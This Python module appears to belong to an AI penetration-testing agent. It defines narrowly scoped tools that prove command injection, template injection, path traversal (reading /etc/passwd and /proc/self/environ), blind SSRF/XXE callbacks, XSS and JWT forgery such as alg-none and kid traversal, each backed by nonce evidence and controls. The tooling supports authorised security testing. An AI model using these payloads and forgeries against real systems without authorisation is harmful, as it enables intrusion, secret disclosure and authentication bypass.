"""proof — the tools that turn a signal into evidence that survives review.

Every tool here produces an evidence record aimed at one entry in the proof
matrix, and each one carries a nonce so the observation can only have come from
the probe that was sent. The tools are deliberately narrow:

* code execution is proven by `id; echo <nonce>` and nothing else. No shell, no
  download, no persistence, no write. The nonce is the proof; the identity line
  is the context.
* a template engine is proven by a product of two nonce-derived numbers, so the
  result cannot appear on the page by chance.
* a file read is proven against a file whose shape is known, together with the
  control request for a path that cannot exist.
* a blind class is proven by a callback at a collector we control.

`proof.verify` grades whatever is already in the ledger, so a model can check
itself before trying to record a finding — and discover the missing control
while the target is still in front of it rather than in the report.
"""
from __future__ import annotations

import base64
import json
import random
import urllib.parse

from ... import config
from ...ledger import proof as matrix
from ...util import read_jsonl
from .. import collector as collector_mod
from .. import httpkit
from ..mcp import Server, ToolContext, ToolError

SERVER = Server("proof", "class-specific proof tools; a nonce in every one")

PLACEHOLDER = "{payload}"

_INJECT = {
    "url": {"type": "string", "description": f"URL containing {PLACEHOLDER}"},
    "body": {"type": "string", "description": f"request body containing {PLACEHOLDER}"},
    "headers": {"type": "object", "description": f"headers; a value may contain {PLACEHOLDER}"},
    "cookies": {"type": "string", "description": f"Cookie header containing {PLACEHOLDER}"},
    "method": {"type": "string", "enum": ["GET", "POST", "PUT", "PATCH", "DELETE"]},
    "encode": {"type": "string", "enum": ["none", "url", "double-url", "base64"],
               "description": "how the payload is encoded before substitution (default url for a "
                              "URL template, none elsewhere)"},
    "timeout": {"type": "integer"},
}


def _encode(payload: str, how: str) -> str:
    if how == "url":
        return urllib.parse.quote(payload, safe="")
    if how == "double-url":
        return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")
    if how == "base64":
        return base64.b64encode(payload.encode()).decode()
    return payload


def _place(payload: str, url: str, body: str, headers: dict | None, cookies: str,
           encode: str) -> tuple[str, str, dict, str, str]:
    """Substitute the payload into whichever part of the request carries it."""
    headers = dict(headers or {})
    slots = []
    if PLACEHOLDER in (url or ""):
        slots.append("url")
    if PLACEHOLDER in (body or ""):
        slots.append("body")
    if any(PLACEHOLDER in str(v) for v in headers.values()):
        slots.append("header")
    if PLACEHOLDER in (cookies or ""):
        slots.append("cookie")
    if not slots:
        raise ToolError(f"no injection point: put {PLACEHOLDER} in url, body, a header value or "
                        f"cookies, at the exact place the payload belongs")
    if not encode:
        encode = "url" if slots == ["url"] else "none"
    encoded = _encode(payload, encode)
    return (url.replace(PLACEHOLDER, encoded) if url else url,
            body.replace(PLACEHOLDER, encoded) if body else body,
            {k: str(v).replace(PLACEHOLDER, encoded) for k, v in headers.items()},
            cookies.replace(PLACEHOLDER, encoded) if cookies else cookies,
            ",".join(slots))


def _send(url: str, method: str, body: str, headers: dict, cookies: str,
          timeout: int) -> httpkit.HttpResponse:
    return httpkit.request(method or "GET", url, headers=headers or None,
                           data=body or None, cookies=cookies or None, timeout=timeout or 20)


# --- code execution ----------------------------------------------------------

@SERVER.tool(
    "proof.exec_marker",
    "Prove code execution by running exactly one benign command: `id; echo <nonce>` on unix, "
    "`whoami & echo <nonce>` on windows. Put {payload} in the URL, body, a header or the cookie, "
    "at the point the command belongs — including any separator the application needs. The proof is "
    "the nonce appearing in the response; the identity line is context. This tool cannot run "
    "anything else, and the intrusive tier must be enabled for the engagement.",
    {"properties": {
        **_INJECT,
        "os_family": {"type": "string", "enum": ["unix", "windows"]},
        "separator": {"type": "string",
                      "description": "prefix placed before the command, e.g. '; ' or '| ' or '$('"},
        "suffix": {"type": "string", "description": "text placed after the command, e.g. ' #' or ')'"},
    }, "required": []},
    tier=config.TIER_INTRUSIVE, step="marker-command", proves="command_output",
)
def exec_marker(context: ToolContext, url: str = "", body: str = "", headers: dict | None = None,
                cookies: str = "", method: str = "GET", encode: str = "", timeout: int = 20,
                os_family: str = "unix", separator: str = "", suffix: str = "") -> dict:
    token = context.nonce()
    command = matrix.marker_command(token, os_family)
    payload = f"{separator}{command}{suffix}"
    sent_url, sent_body, sent_headers, sent_cookies, slot = _place(
        payload, url, body, headers, cookies, encode)
    response = _send(sent_url, method, sent_body, sent_headers, sent_cookies, timeout)
    text = response.body or ""
    echoed = token in text
    identity = matrix.UID_RE.search(text) or matrix.WINID_RE.search(text)
    evidence = {
        "kind": "probe", "target": url or body or "(header injection)", "tool": "proof.exec_marker",
        "nonce": token, "payload": payload, "command": [command],
        "stdout_span": text[:8000],
        **response.to_evidence(),
    }
    verdict = matrix.verify("rce", [evidence])
    return {
        "ok": True,
        "summary": (f"nonce {'echoed' if echoed else 'NOT echoed'} | "
                    f"identity: {identity.group(0) if identity else 'none'} | "
                    f"injected into {slot} | HTTP {response.status}"),
        "result": "signal" if echoed else "no-signal",
        "data": {"nonce": token, "command": command, "echoed": echoed,
                 "identity": identity.group(0) if identity else None,
                 "injected_into": slot, "status": response.status,
                 "proof_grade": verdict.grade},
        "output": text[:4000],
        "evidence": evidence,
        "next": ("the rce proof requirement is met: record the finding with this evidence id"
                 if verdict.proven else
                 "the nonce did not come back. Either the separator is wrong, or the output is not "
                 "returned at all — if the latter, prove it blind with proof.oob_start instead"),
    }


# --- template / expression evaluation ---------------------------------------

@SERVER.tool(
    "proof.template_eval",
    "Prove server-side template or expression injection with a product of two nonce-derived "
    "numbers. A six-digit result that appears while the literal expression does not is evidence; "
    "`{{7*7}}` returning 49 is not, because 49 appears on plenty of pages by accident.",
    {"properties": {
        **_INJECT,
        "expression_template": {"type": "string",
                                "description": "how the engine writes an expression; {a} and {b} "
                                               "are substituted. Default '{{ {a}*{b} }}'"},
    }, "required": []},
    tier=config.TIER_ACTIVE, step="nonce-arithmetic", proves="template_eval",
)
def template_eval(context: ToolContext, url: str = "", body: str = "", headers: dict | None = None,
                  cookies: str = "", method: str = "GET", encode: str = "", timeout: int = 20,
                  expression_template: str = "{{ {a}*{b} }}") -> dict:
    left, right = random.randint(1361, 9973), random.randint(1361, 9973)
    expected = str(left * right)
    expression = expression_template.format(a=left, b=right)
    sent_url, sent_body, sent_headers, sent_cookies, slot = _place(
        expression, url, body, headers, cookies, encode)
    response = _send(sent_url, method, sent_body, sent_headers, sent_cookies, timeout)
    text = response.body or ""
    evaluated = expected in text
    echoed = expression in text or expression.replace(" ", "") in text.replace(" ", "")
    evidence = {
        "kind": "probe", "target": url or body or "(header injection)",
        "tool": "proof.template_eval", "payload": expression,
        "extracted": {"expected_result": expected, "evaluated": evaluated,
                      "expression_echoed": echoed},
        **response.to_evidence(),
    }
    verdict = matrix.verify("ssti", [evidence])
    return {
        "summary": (f"{expression} -> {'result present' if evaluated else 'result absent'}"
                    f"{', expression echoed verbatim' if echoed else ''} | HTTP {response.status}"),
        "result": "signal" if (evaluated and not echoed) else "no-signal",
        "data": {"expression": expression, "expected": expected, "evaluated": evaluated,
                 "expression_echoed": echoed, "injected_into": slot,
                 "proof_grade": verdict.grade},
        "output": text[:4000],
        "evidence": evidence,
        "next": ("proven: record it, then identify the engine before attempting any escape"
                 if verdict.proven else
                 "the expression was echoed, not evaluated: try another delimiter family "
                 "(${...}, <%= %>, #{...}, {{...}}) before concluding anything"),
    }


# --- file read ---------------------------------------------------------------

UNIX_CANDIDATES = ("/etc/passwd", "/etc/hostname", "/proc/self/environ")
WINDOWS_CANDIDATES = ("C:\\windows\\win.ini", "C:\\windows\\system32\\drivers\\etc\\hosts")
TRAVERSALS = ("", "../", "../../", "../../../", "../../../../", "../../../../../../",
              "....//", "..%2f..%2f..%2f", "%2e%2e%2f%2e%2e%2f%2e%2e%2f")


@SERVER.tool(
    "proof.file_read",
    "Prove an arbitrary file read, with its control. Tries a known file at several traversal "
    "depths, then issues one request for a path that cannot exist so the response shape of "
    "'not found' is on record. Both records are stored; the proof requirement needs both.",
    {"properties": {
        **_INJECT,
        "os_family": {"type": "string", "enum": ["unix", "windows"]},
        "candidates": {"type": "array", "description": "override the files to try"},
        "max_attempts": {"type": "integer", "description": "default 12"},
    }, "required": []},
    tier=config.TIER_ACTIVE, step="known-file-read", proves="file_read",
)
def file_read(context: ToolContext, url: str = "", body: str = "", headers: dict | None = None,
              cookies: str = "", method: str = "GET", encode: str = "", timeout: int = 20,
              os_family: str = "unix", candidates: list | None = None,
              max_attempts: int = 12) -> dict:
    files = [str(c) for c in (candidates or (UNIX_CANDIDATES if os_family == "unix"
                                             else WINDOWS_CANDIDATES))]
    attempts, hit, hit_payload, hit_label = [], None, None, None
    budget = max(1, min(int(max_attempts), 30))
    for target_file in files:
        for traversal in TRAVERSALS:
            if len(attempts) >= budget or hit is not None:
                break
            payload = traversal + target_file.lstrip("/") if traversal else target_file
            sent_url, sent_body, sent_headers, sent_cookies, _slot = _place(
                payload, url, body, headers, cookies, encode)
            response = _send(sent_url, method, sent_body, sent_headers, sent_cookies, timeout)
            attempts.append({"payload": payload, "status": response.status,
                             "length": response.length})
            for label, pattern in matrix.FILE_SENTINELS:
                if pattern.search(response.body or ""):
                    hit, hit_payload, hit_label = response, payload, label
                    break
    token = context.nonce()
    control_payload = f"/etc/argus-{token}-does-not-exist"
    control_url, control_body, control_headers, control_cookies, _ = _place(
        control_payload, url, body, headers, cookies, encode)
    control = _send(control_url, method, control_body, control_headers, control_cookies, timeout)

    evidence = {
        "kind": "probe", "target": url or body or "(header injection)", "tool": "proof.file_read",
        "payload": hit_payload, "nonce": token,
        "extracted": {"sentinel": hit_label, "attempts": attempts},
        **(hit.to_evidence() if hit is not None else {}),
    }
    control_record = {
        "kind": "control", "is_control": True, "target": url or body,
        "tool": "proof.file_read", "payload": control_payload,
        "extracted": {"purpose": "a path that cannot exist, to fix what 'not found' looks like"},
        **control.to_evidence(),
    }
    verdict = matrix.verify("lfi", [evidence, control_record])
    return {
        "summary": (f"{hit_label} read with payload {hit_payload!r}" if hit else
                    f"no known-file sentinel in {len(attempts)} attempt(s)")
                   + f" | control {control_payload} -> {control.status}/{control.length}B",
        "result": "signal" if hit else "no-signal",
        "data": {"sentinel": hit_label, "payload": hit_payload, "attempts": attempts,
                 "control": {"payload": control_payload, "status": control.status,
                             "length": control.length},
                 "proof_grade": verdict.grade},
        "output": (hit.body[:3000] if hit else "\n".join(
            f"{a['status']} {a['length']:>7}B  {a['payload']}" for a in attempts)),
        "evidence": evidence,
        "extra_evidence": [control_record],
        "next": ("proven with its control: record the finding" if verdict.proven else
                 "no sentinel: the parameter may be filtered, or may not reach a filesystem read "
                 "at all. Read what fills the path before spending more attempts"),
    }


# --- out of band -------------------------------------------------------------

@SERVER.tool(
    "proof.oob_start",
    "Start a local HTTP collector and return the URL to put in a payload. Use it for the blind "
    "classes: SSRF, blind XXE, JNDI. The collector binds an interface on THIS machine, so the "
    "target must have a route back to it — which is true in a lab or on an internal engagement and "
    "false for most internet targets.",
    {"properties": {"bind": {"type": "string", "description": "default 0.0.0.0"},
                    "port": {"type": "integer", "description": "default an ephemeral port"},
                    "advertise_host": {"type": "string",
                                       "description": "the address to put in the payload; one of the "
                                                      "local addresses by default"}},
     "required": []},
    tier=config.TIER_PASSIVE, touches_target=False,
)
def oob_start(context: ToolContext, bind: str = "0.0.0.0", port: int = 0,
              advertise_host: str = "") -> dict:
    hits_path = context.paths.dir / "oob-hits.jsonl"
    existing = collector_mod.running()
    if existing:
        active = next(iter(existing.values()))
        bound_port = active.port
    else:
        active = collector_mod.start(hits_path, bind=bind, port=int(port))
        bound_port = active.port
    addresses = collector_mod.local_addresses()
    host = advertise_host or next((a for a in addresses if not a.startswith("127.")), addresses[0])
    token = context.nonce()
    return {
        "summary": f"collector listening on {bind}:{bound_port}; use http://{host}:{bound_port}/{token}",
        "data": {"collector_url": f"http://{host}:{bound_port}/{token}", "token": token,
                 "port": bound_port, "local_addresses": addresses,
                 "hits_file": str(hits_path)},
        "next": f"send the payload, then call proof.oob_check with token={token}",
    }


@SERVER.tool(
    "proof.oob_check",
    "Read the collector's hits for one token. A hit is the proof for a blind class: it records the "
    "source address, the path and the headers the target sent. No hit is not a negative result — "
    "it may mean egress is blocked, which is a separate measurement.",
    {"properties": {"token": {"type": "string"},
                    "since_seconds": {"type": "integer", "description": "default 600"}},
     "required": ["token"]},
    tier=config.TIER_PASSIVE, touches_target=False,
)
def oob_check(context: ToolContext, token: str, since_seconds: int = 600) -> dict:
    hits_path = context.paths.dir / "oob-hits.jsonl"
    hits = [hit for hit in read_jsonl(hits_path) if token in json.dumps(hit, ensure_ascii=False)]
    records = [{"kind": "oob", "nonce": token, "tool": "proof.oob_check",
                "source_ip": hit.get("source_ip"), "callback_payload": json.dumps(hit)[:2000],
                "extracted": {"path": hit.get("path"), "method": hit.get("method"),
                              "user_agent": (hit.get("headers") or {}).get("user-agent")}}
               for hit in hits]
    verdict = matrix.verify("ssrf", records + [{"nonce": token, "kind": "probe"}])
    return {
        "summary": (f"{len(hits)} callback(s) for {token} from "
                    f"{sorted({h.get('source_ip') for h in hits})}" if hits else
                    f"no callback for {token}"),
        "result": "signal" if hits else "no-signal",
        "data": {"hits": hits[:20], "proof_grade": verdict.grade},
        "output": "\n".join(f"{h['ts']} {h['source_ip']} {h['method']} {h['path']}" for h in hits[:20]),
        "extra_evidence": records,
        "evidence": None,
        "next": ("record the finding with these records" if hits else
                 "no hit yet. Retry once, then test whether the target has egress at all before "
                 "concluding the class is absent"),
    }


# --- client-side execution ---------------------------------------------------

@SERVER.tool(
    "proof.browser_exec",
    "Prove client-side execution by loading a URL in a real headless browser and reporting whether "
    "the payload ran. Needs playwright; when it is absent this tool says so and tells you to drive "
    "the browser through the playwright MCP server instead. Reflection is never accepted as "
    "execution by the proof matrix.",
    {"properties": {"url": {"type": "string", "description": "the URL with the payload already in it"},
                    "expect_nonce": {"type": "string",
                                     "description": "the nonce the payload writes to document.title "
                                                    "or console"},
                    "timeout": {"type": "integer"}},
     "required": ["url"]},
    tier=config.TIER_ACTIVE, step="browser-execution", proves="browser_execution",
)
def browser_exec(context: ToolContext, url: str, expect_nonce: str = "", timeout: int = 30) -> dict:
    token = expect_nonce or context.nonce()
    try:
        from playwright.sync_api import sync_playwright          # noqa: PLC0415
    except ImportError:
        raise ToolError(
            "playwright is not installed in this interpreter. Either `pip install playwright && "
            "playwright install chromium` in a virtualenv, or drive a browser through the "
            "playwright MCP server and record the result with ledger.add_evidence "
            "(kind=browser, executed=true, nonce=<the nonce the payload printed>). "
            "A reflected payload with no browser record stays `supported`, never `proven`."
        ) from None
    console, dialogs, executed = [], [], False
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(args=["--no-sandbox"])
        page = browser.new_page()
        page.on("console", lambda message: console.append(message.text))
        page.on("dialog", lambda dialog: (dialogs.append(dialog.message), dialog.dismiss()))
        page.goto(url, timeout=timeout * 1000)
        page.wait_for_timeout(1500)
        title = page.title()
        executed = token in " ".join(console) or token in " ".join(dialogs) or token in title
        content = page.content()[:4000]
        browser.close()
    evidence = {"kind": "browser", "target": url, "tool": "proof.browser_exec", "nonce": token,
                "executed": executed, "reflected_context": "browser",
                "extracted": {"console": console[:20], "dialogs": dialogs[:10], "title": title},
                "response": {"status": 200, "body_span": content}}
    verdict = matrix.verify("xss", [evidence])
    return {
        "summary": f"browser {'executed' if executed else 'did not execute'} the payload; "
                   f"console={len(console)} dialogs={len(dialogs)}",
        "result": "signal" if executed else "no-signal",
        "data": {"executed": executed, "console": console[:20], "dialogs": dialogs[:10],
                 "proof_grade": verdict.grade},
        "evidence": evidence,
        "next": "record it" if verdict.proven else "the payload did not run: re-read the context first",
    }


# --- grading -----------------------------------------------------------------

@SERVER.tool(
    "proof.requirement",
    "Show what a class must produce before it can be recorded: the requirement sentence, the "
    "required checks, and the ladder step that satisfies it. Read this BEFORE probing a class, not "
    "after.",
    {"properties": {"vuln_class": {"type": "string"}}, "required": ["vuln_class"]},
    tier=config.TIER_PASSIVE, touches_target=False,
)
def requirement(context: ToolContext, vuln_class: str) -> dict:
    spec = matrix.spec_for(vuln_class)
    if spec is None:
        return {"ok": False, "error": "unknown-class",
                "message": f"{vuln_class!r} is not in the proof matrix. Known: {matrix.classes()}. "
                           f"{matrix.CANDIDATE_ONLY.get(vuln_class.lower(), '')}"}
    from ...knowledge import playbook
    return {
        "summary": f"{spec.vuln_class} ({spec.kind}, default severity {spec.severity}): {spec.requirement}",
        "data": {"vuln_class": spec.vuln_class, "kind": spec.kind, "severity": spec.severity,
                 "requirement": spec.requirement, "required_checks": list(spec.required_checks),
                 "benign_proof": spec.benign_proof, "notes": spec.notes,
                 "ladder": playbook.ladder(spec.vuln_class),
                 "refusal": spec.refusal},
    }


@SERVER.tool(
    "proof.verify",
    "Grade evidence already in the ledger against a class's proof requirement, and report exactly "
    "which checks pass and which do not. Call this before record_finding: the gap it names is "
    "usually one request away while the target is still in front of you.",
    {"properties": {"vuln_class": {"type": "string"},
                    "evidence_ids": {"type": "array", "description": "evidence ids to grade"},
                    "hypothesis": {"type": "string",
                                   "description": "grade every record attached to this hypothesis"}},
     "required": ["vuln_class"]},
    tier=config.TIER_PASSIVE, touches_target=False,
)
def verify(context: ToolContext, vuln_class: str, evidence_ids: list | None = None,
           hypothesis: str = "") -> dict:
    state = context.state
    if hypothesis:
        records = state.evidence_for(hypothesis_id=hypothesis)
    else:
        records = state.load_evidence([str(i) for i in (evidence_ids or [])])
    if not records:
        return {"ok": False, "error": "no-evidence",
                "message": "no evidence records matched; pass evidence_ids or hypothesis"}
    verdict = matrix.verify(vuln_class, records)
    return {
        "summary": f"{vuln_class}: {verdict.grade} over {len(records)} record(s)",
        "data": verdict.to_dict(),
        "output": verdict.explain(),
        "next": ("record_finding will accept this" if verdict.proven else
                 f"close this first: {', '.join(verdict.missing) or verdict.requirement}"),
    }


# --- token forgery -----------------------------------------------------------

_JWT_TRANSFORMS = ("alg-none", "strip-signature", "claim-swap", "expiry-extend",
                   "kid-traversal", "garbage")


def _b64url_decode(segment: str) -> bytes:
    padding = "=" * (-len(segment) % 4)
    return base64.urlsafe_b64decode(segment + padding)


def _b64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")


def _jwt_parts(token: str) -> tuple[dict, dict, str] | None:
    pieces = token.split(".")
    if len(pieces) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(pieces[0]))
        payload = json.loads(_b64url_decode(pieces[1]))
    except (ValueError, json.JSONDecodeError):
        return None
    if not isinstance(header, dict) or not isinstance(payload, dict):
        return None
    return header, payload, pieces[2]


def _forge(token: str, transform: str, claims: dict | None) -> tuple[str, str] | None:
    """Return (forged token, what was changed), or None when it does not apply."""
    parsed = _jwt_parts(token)
    if transform == "garbage":
        return ("eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhcmd1cy1jb250cm9sIn0.notasignature",
                "a deliberately invalid token, as the control")
    if parsed is None:
        return None
    header, payload, _signature = parsed
    if transform == "alg-none":
        forged_header = {**header, "alg": "none"}
        return (f"{_b64url_encode(json.dumps(forged_header).encode())}."
                f"{_b64url_encode(json.dumps(payload).encode())}.",
                "alg set to none and the signature removed")
    if transform == "strip-signature":
        return (f"{token.rsplit('.', 1)[0]}.", "the signature removed, algorithm untouched")
    if transform == "claim-swap":
        if not claims:
            return None
        forged = {**payload, **claims}
        return (f"{token.split('.')[0]}.{_b64url_encode(json.dumps(forged).encode())}."
                f"{token.split('.')[2]}",
                f"claims replaced with {json.dumps(claims)}, signature left as it was")
    if transform == "expiry-extend":
        if "exp" not in payload:
            return None
        forged = {**payload, "exp": int(payload["exp"]) + 86400 * 365}
        return (f"{token.split('.')[0]}.{_b64url_encode(json.dumps(forged).encode())}."
                f"{token.split('.')[2]}", "exp extended by a year, signature left as it was")
    if transform == "kid-traversal":
        forged_header = {**header, "kid": "../../../../dev/null"}
        return (f"{_b64url_encode(json.dumps(forged_header).encode())}."
                f"{_b64url_encode(json.dumps(payload).encode())}.{token.split('.')[2]}",
                "kid pointed at a traversal path")
    return None


@SERVER.tool(
    "proof.token_probe",
    "Probe whether a session or bearer token is actually verified. Sends the original token as a "
    "baseline, then each requested forgery, then a deliberately invalid token as the control, and "
    "reports which the endpoint accepted. The auth-bypass requirement needs all three: a forged "
    "token accepted, an invalid one rejected, and privileged content in the response — acceptance "
    "alone may just mean the endpoint never needed a token.",
    {"properties": {
        "url": {"type": "string", "description": "a resource that should require authentication"},
        "token": {"type": "string", "description": "the token as issued to you"},
        "location": {"type": "string",
                     "description": "where the token goes: 'header:Authorization' (default, sent "
                                    "as Bearer), 'header:X-Token', 'cookie:session', 'query:t'"},
        "transforms": {"type": "array",
                       "description": f"any of {list(_JWT_TRANSFORMS)}; default alg-none, "
                                      f"strip-signature, garbage"},
        "claims": {"type": "object", "description": "claims to substitute for claim-swap"},
        "privileged_marker": {"type": "string",
                              "description": "a string whose presence shows a privilege gain"},
        "method": {"type": "string", "enum": ["GET", "POST", "PUT", "DELETE"]},
        "timeout": {"type": "integer"},
    }, "required": ["url", "token"]},
    tier=config.TIER_ACTIVE, step="forge-attempt", proves="token_forgery",
)
def token_probe(context: ToolContext, url: str, token: str,
                location: str = "header:Authorization", transforms: list | None = None,
                claims: dict | None = None, privileged_marker: str = "",
                method: str = "GET", timeout: int = 20) -> dict:
    wanted = [str(t) for t in (transforms or ["alg-none", "strip-signature", "garbage"])]
    unknown = [t for t in wanted if t not in _JWT_TRANSFORMS]
    if unknown:
        raise ToolError(f"unknown transform(s) {unknown}; available: {list(_JWT_TRANSFORMS)}")
    if "garbage" not in wanted:
        wanted.append("garbage")                     # the control is not optional

    def send(candidate: str | None) -> httpkit.HttpResponse:
        headers, cookies, target = {}, None, url
        if candidate is not None:
            kind, _, field = location.partition(":")
            field = field or "Authorization"
            if kind == "cookie":
                cookies = f"{field}={candidate}"
            elif kind == "query":
                target = f"{url}{'&' if '?' in url else '?'}{field}={urllib.parse.quote(candidate)}"
            else:
                headers[field] = (f"Bearer {candidate}" if field.lower() == "authorization"
                                  else candidate)
        return httpkit.request(method, target, headers=headers or None, cookies=cookies,
                               timeout=timeout)

    baseline = send(token)
    no_token = send(None)
    attempts, records = [], []
    parsed = _jwt_parts(token)
    for transform in wanted:
        forged = _forge(token, transform, claims)
        if forged is None:
            attempts.append({"transform": transform, "applied": False,
                             "why": "does not apply to this token"})
            continue
        candidate, changed = forged
        response = send(candidate)
        accepted = (response.status == baseline.status
                    and response.status is not None and response.status < 400)
        marker = bool(privileged_marker and privileged_marker in (response.body or ""))
        attempts.append({"transform": transform, "applied": True, "changed": changed,
                         "status": response.status, "length": response.length,
                         "accepted": accepted, "privileged_marker": marker})
        records.append({
            "kind": "control" if transform == "garbage" else "probe",
            "is_control": transform == "garbage",
            "tool": "proof.token_probe", "payload": changed,
            "token_accepted": accepted,
            "privileged_marker": privileged_marker if marker else None,
            **response.to_evidence(),
            "extracted": {"transform": transform, "changed": changed},
        })
    primary = next((record for record in records
                    if record.get("token_accepted") and not record.get("is_control")), None)
    records.append({"kind": "control", "is_control": True, "tool": "proof.token_probe",
                    "payload": "no token at all", "token_accepted":
                        no_token.status is not None and no_token.status < 400,
                    **no_token.to_evidence(),
                    "extracted": {"purpose": "does the endpoint require a token at all"}})
    verdict = matrix.verify("auth-bypass", records)
    accepted_names = [a["transform"] for a in attempts if a.get("accepted")]
    return {
        "summary": (f"baseline {baseline.status}, no-token {no_token.status}; accepted: "
                    f"{accepted_names or 'none'}; "
                    f"{'JWT' if parsed else 'opaque token'}"),
        "result": "signal" if [name for name in accepted_names if name != "garbage"] else "no-signal",
        "data": {"baseline_status": baseline.status, "no_token_status": no_token.status,
                 "attempts": attempts, "is_jwt": parsed is not None,
                 "header": parsed[0] if parsed else None,
                 "proof_grade": verdict.grade},
        "output": "\n".join(f"{a['transform']:18} {'applied' if a.get('applied') else 'n/a':8} "
                            f"{a.get('status','-')} {'ACCEPTED' if a.get('accepted') else ''}"
                            for a in attempts),
        "evidence": primary or records[0],
        "extra_evidence": [record for record in records if record is not primary],
        "next": ("the auth-bypass requirement is met: record the finding"
                 if verdict.proven else
                 f"close this first: {', '.join(verdict.missing) or 'take the controls'}"
                 + ("; the no-token control succeeded, so the endpoint may need no "
                    "authentication at all — that is a different and simpler finding"
                    if no_token.status and no_token.status < 400 else "")),
    }
